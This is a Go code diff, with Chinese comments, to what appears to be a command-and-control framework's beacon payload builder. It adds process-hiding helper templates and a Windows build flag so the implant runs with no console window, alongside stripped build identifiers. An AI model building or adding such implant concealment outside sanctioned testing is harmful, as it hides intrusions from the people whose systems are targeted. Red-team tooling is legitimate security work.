@@ -160,6 +160,18 @@ func (b *PayloadBuilder) BuildBeacon(in PayloadBuilderInput) (*BuildResult, erro
 	}
 	f.Close()
 
+	// 平台相关辅助源文件（如无窗口子进程）
+	for _, name := range []string{"proc_hide_windows.go", "proc_hide_unix.go"} {
+		helperSrc := filepath.Join(b.tmplDir, name+".tmpl")
+		helperData, readErr := os.ReadFile(helperSrc)
+		if readErr != nil {
+			return nil, fmt.Errorf("read helper %s: %w", name, readErr)
+		}
+		if writeErr := os.WriteFile(filepath.Join(workDir, name), helperData, 0644); writeErr != nil {
+			return nil, fmt.Errorf("write helper %s: %w", name, writeErr)
+		}
+	}
+
 	// 交叉编译
 	binName := strings.TrimSpace(in.OutputName)
 	if binName == "" {
@@ -174,15 +186,16 @@ func (b *PayloadBuilder) BuildBeacon(in PayloadBuilderInput) (*BuildResult, erro
 		return nil, fmt.Errorf("mkdir output: %w", err)
 	}
 
-	absSrcPath, err := filepath.Abs(srcPath)
-	if err != nil {
-		return nil, fmt.Errorf("abs source path: %w", err)
-	}
 	absBinPath, err := filepath.Abs(binPath)
 	if err != nil {
 		return nil, fmt.Errorf("abs output path: %w", err)
 	}
-	cmd := exec.Command("go", "build", "-ldflags", "-s -w -buildid=", "-trimpath", "-o", absBinPath, absSrcPath)
+	ldflags := "-s -w -buildid="
+	if goos == "windows" {
+		// 无控制台窗口运行 beacon 本体
+		ldflags += " -H windowsgui"
+	}
+	cmd := exec.Command("go", "build", "-ldflags", ldflags, "-trimpath", "-o", absBinPath, ".")
 	cmd.Env = append(os.Environ(),
 		"GOOS="+goos,
 		"GOARCH="+goarch,
